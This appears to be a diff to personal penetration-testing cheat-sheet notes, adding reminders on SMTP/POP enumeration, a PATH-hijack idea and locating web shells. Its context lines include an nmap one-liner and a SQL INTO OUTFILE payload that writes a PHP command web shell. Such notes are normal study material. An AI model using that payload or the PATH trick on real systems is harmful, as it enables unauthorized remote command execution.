@@ -24,6 +24,11 @@
 
     - ports=$(sudo nmap -Pn -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $ports
 
+- smtp/pop 
+  - enumerate
+  - send email (file)
+  - locate it
+
 ### DNS
 - Port 53 UDP/TCP
   - -sU UDP
@@ -142,7 +147,8 @@
   
 - Automatic
   - linpeas
-  - 
+
+- export PATH=/tmp:$PATH = possible?
 
 ## Web
 - dirb | dirsearch | gobuster | ffuz | wfuzz
@@ -163,6 +169,7 @@
   - group_concat() = all values from != rows into one string
   - Where are files written? / DocumentRoot
     - SELECT "<?php system($_GET['cmd']); ?>" into outfile "PATH/TO/SQL"
+  - locate webshells
 
 ## Upload files
 ### Windows
